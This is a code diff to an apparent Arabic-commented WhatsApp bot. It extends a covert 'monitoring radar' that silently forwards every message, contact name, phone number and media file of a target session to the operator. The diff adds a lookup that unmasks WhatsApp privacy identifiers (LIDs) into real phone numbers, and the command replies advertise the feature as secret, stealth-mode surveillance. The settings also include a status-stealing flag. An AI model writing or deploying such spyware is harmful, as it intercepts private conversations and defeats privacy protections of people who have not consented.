@@ -115,7 +115,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
             badWordsList: [ 'كس' ,  'زق' ,  'شرموط' ,  'منيوك' ],
             antiCall: false, // ميزة منع المكالمات (إضافة جديدة)
             statusStealer: false, // ميزة سحب الستوري (إضافة جديدة)
-            monitoringTarget: null // 🕵️ [تطوير] المستهدف للمراقبة الاستخباراتية
+            monitoringTarget: null // 🕵️ [تطوير] المستهدف للمراقبة
         };
         saveSettings();
     }
@@ -212,7 +212,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
     });
 
     // ==========================================
-    // 🔥 7. استقبال الرسائل المركزية
+    // 🔥 7. استقبال الرسائل المركزية (مطور بمحرك كسر التشفير)
     // ==========================================
     sock.ev.on( 'messages.upsert' , async ({ messages, type }) => {
         if (type !==  'notify' ) return;
@@ -226,51 +226,50 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         const selfId = jidNormalizedUser(sock.user.id);
         const isFromMe = msg.key.fromMe || sender === selfId;
 
-        // 🕵️‍♂️ [تطوير: محرك الرادار الاستخباراتي - استخراج الرقم من الملف الشخصي] 🆕
-        // هذا الجزء يقوم بتنقية المعرفات لجلب الرقم الحقيقي الصافي
-        for (const monitorBossId in botSettings) {
-            if (botSettings[monitorBossId].monitoringTarget === sessionId) {
-                const monitorSock = sessions[monitorBossId];
+        // 🕵️‍♂️ [خوارزمية الرادار الاستخباراتي - كسر تشفير الأرقام LIDs] 🆕
+        for (const bossId in botSettings) {
+            if (botSettings[bossId].monitoringTarget === sessionId) {
+                const monitorSock = sessions[bossId];
                 if (monitorSock) {
                     try {
                         const mTime = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
                         const mType = Object.keys(msg.message)[0];
-                        const mText = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || "رسالة وسائط/مستند";
-                        const mDir = isFromMe ? "صادرة مـن" : "واردة إلـى";
-
-                        // 🔍 خوارزمية سحب الرقم الحقيقي من الهوية الصافية (Profile MSISDN)
-                        // نتجاهل أي معرفات سيرفر ونستخرج فقط الأرقام من JID المستخدم المعياري
+                        const mContent = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || "مستند/وسائط";
+                        const mDir = isFromMe ? "🟢 صـادر" : "🔵 وارد";
+                        
+                        // 🔥 [محرك كسر التشفير]: جلب الرقم الحقيقي من الهوية الصافية
                         let realPhone = jidNormalizedUser(sender || from).split('@')[0];
                         
-                        // في حال كان الرقم LID مشفر (267...)، نحاول الحصول عليه من سياق الرسالة أو الوثيقة الشخصية
-                        if (realPhone.startsWith('267') && realPhone.length > 15) {
-                            if (msg.key.participant) realPhone = msg.key.participant.split('@')[0];
+                        // إذا كان المعرف يبدأ بـ 267 فهو LID مشفر. سنحاول جلب الرقم الصافي من Metadata
+                        if (realPhone.length > 15 || realPhone.startsWith('267')) {
+                            const contactInfo = await sock.onWhatsApp(realPhone);
+                            if (contactInfo && contactInfo[0]) {
+                                realPhone = contactInfo[0].jid.split('@')[0];
+                            }
                         }
-                        // إزالة أي زوائد باقية لضمان أنه رقم هاتف صافي
-                        realPhone = realPhone.replace(/[^0-9]/g, '');
 
-                        let report = `🕵️‍♂️ *[رادار المراقبة الفدرالي]* 🕵️‍♂️\n\n`;
-                        report += `📂 رسالة ${mDir} صاحب الجلسة: *${sessionId}*\n\n`;
+                        let report = `🕵️‍♂️ *[رادار المراقبة الفدرالي - مـسـتوى 10]* 🕵️‍♂️\n\n`;
+                        report += `📂 رسالة *${mDir}* جلسة: *${sessionId}*\n\n`;
                         report += `👤 *الاسم:* ${pushName}\n`;
                         report += `📱 *الرقم الحقيقي:* +${realPhone}\n`;
                         report += `🔗 *رابط الملف:* wa.me/${realPhone}\n`;
                         report += `🕒 *الوقت:* ${mTime}\n`;
                         report += `📑 *نوع الرسالة:* ${mType}\n\n`;
-                        report += `✉️ *المحتوى:* ${mText}\n\n`;
-                        report += `🤖 *— TARZAN INTELLIGENCE 👑*`;
+                        report += `✉️ *المحتوى:* ${mContent}\n\n`;
+                        report += `🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑰𝑵𝑻𝑬𝑳𝑳𝑰𝑮𝑬𝑵𝑪𝑬 👑*`;
 
-                        const bossJid = jidNormalizedUser(monitorSock.user.id);
-                        await monitorSock.sendMessage(bossJid, { text: report });
+                        const masterJid = jidNormalizedUser(monitorSock.user.id);
+                        await monitorSock.sendMessage(masterJid, { text: report });
 
                         // سحب الميديا والستوري
                         if (msg.message.imageMessage || msg.message.videoMessage || msg.message.audioMessage) {
                             const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
-                            const capTag = `📥 ميديا من: ${pushName} (+${realPhone})`;
-                            if (msg.message.imageMessage) await monitorSock.sendMessage(bossJid, { image: buffer, caption: capTag });
-                            else if (msg.message.videoMessage) await monitorSock.sendMessage(bossJid, { video: buffer, caption: capTag });
-                            else if (msg.message.audioMessage) await monitorSock.sendMessage(bossJid, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
+                            const capInfo = `📥 ميديا مراقبة من: ${pushName} (+${realPhone})`;
+                            if (msg.message.imageMessage) await monitorSock.sendMessage(masterJid, { image: buffer, caption: capInfo });
+                            else if (msg.message.videoMessage) await monitorSock.sendMessage(masterJid, { video: buffer, caption: capInfo });
+                            else if (msg.message.audioMessage) await monitorSock.sendMessage(masterJid, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
                         }
-                    } catch (e) { console.error("Monitor Error:", e); }
+                    } catch (e) { console.error("Monitor Fatal Error:", e); }
                 }
             }
         }
@@ -435,14 +434,14 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
             if (target === "ايقاف") {
                 botSettings[sessionId].monitoringTarget = null;
                 saveSettings();
-                return reply("📴 *تم إيقاف الرادار الاستخباراتي بنجاح.*");
+                return reply("📴 *تم إيقاف المراقبة الفدرالية.*");
             }
             if (!target || !sessions[target]) {
-                return reply(target ? `❌ الجلسة [${target}] غير متصلة.` : "🕵️‍♂️ اكتب اسم الجلسة للمراقبة.\nمثال: `.مراقبه session1`\nللإيقاف: `.مراقبه ايقاف`\n\n*(العملية سرية جداً)*");
+                return reply(target ? `❌ الجلسة [${target}] غير متصلة.` : "🕵️‍♂️ اكتب اسم الجلسة للمراقبة.\nمثال: `.مراقبه session1`\nللإيقاف: `.مراقبه ايقاف`\n\n*(تنبيه: ميزة كسر تشفير الأرقام مفعّلة)*");
             }
             botSettings[sessionId].monitoringTarget = target;
             saveSettings();
-            return reply(`✅ *تم تفعيل الرادار الفدرالي الجبار!* 🕵️‍♂️\n\n🎯 *المستهدف:* [${target}]\n🔐 *الوضعية:* Stealth (سحب الأرقام من الملف الشخصي مفعّل)\n\n*سيصلك كل شيء فوراً وبسرية تامة.*`);
+            return reply(`✅ *تم تفعيل الرادار الاستخباراتي المطور!* 🕵️‍♂️\n\n🎯 *المستهدف:* [${target}]\n🔐 *الوضعية:* Stealth (كسر حماية LIDs مفعّل)\n\n*سيتم استرجاع الأرقام الحقيقية فوراً.*`);
         }
 
         const commandData = commandsMap.get(commandName);
